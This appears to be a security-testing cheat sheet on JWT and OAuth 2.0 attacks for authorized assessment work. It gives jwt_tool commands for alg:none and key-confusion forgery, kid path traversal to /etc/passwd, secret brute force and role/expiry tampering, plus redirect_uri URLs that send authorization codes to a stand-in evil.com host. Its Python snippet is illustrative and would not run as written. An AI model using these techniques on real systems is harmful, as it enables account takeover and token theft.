# JWT + OAuth 2.0 security testing

## JWT attack surface

### 1. Algorithm confusion

```bash
# alg:none — classic
# Original: {"alg":"RS256","typ":"JWT"}.payload.signature
# Attack: {"alg":"none","typ":"JWT"}.payload.  (empty signature)

# RS256 → HS256 key confusion
# If the server verifies HS256 with the RS256 public key
# Sign with the public key as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid injection
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# Server uses file contents pointed by kid as HMAC key
```

### 2. jwt_tool usage

```bash
# Full scan
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# Weak-key brute force
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Claim tampering
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA key confusion
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Embedded JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. Manual JWT tampering

```python
import jwt
import base64

# Decode (no verify)
header, payload, sig = jwt.split('.')

# Tamper payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 attack surface

### Authorization Code Grant

```text
1. redirect_uri manipulation
   Normal: https://app.com/callback?code=AUTH_CODE
   Attack: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
         Open redirect + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via missing state
   No state → attacker binds own code to victim session

3. Missing PKCE
   No code_challenge → authorization-code interception

4. Token leak in Referer
   Callback loads third-party resource → Referer carries code/token
```

### Implicit Grant (deprecated, still deployed)

```text
1. access_token in URL fragment → Referer leak
2. token in browser history → physical-access risk
3. No client authentication → token substitution
```

### Client Credentials Grant

```text
1. client_secret leak (frontend/mobile hardcoded)
2. Over-granted scope
3. No client rate limit → brute enumeration
```

### Generic OAuth tests

```text
□ Scope elevation: scope=read → scope=read%20write
□ Token replay: old access_token against new resource
□ Refresh-token abuse: infinite refresh
□ Cross-tenant: tenant A token against tenant B
□ Token leak in logs/URL/Referer
```

## Tools

```bash
# JWT testing
pip install jwt-tool pyjwt

# OAuth testing
# Burp Suite + OAuth Scanner extension
# Postman OAuth 2.0 flow testing

# Automation
# Entropy: auto JWT tamper + OAuth redirect_uri tests
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research
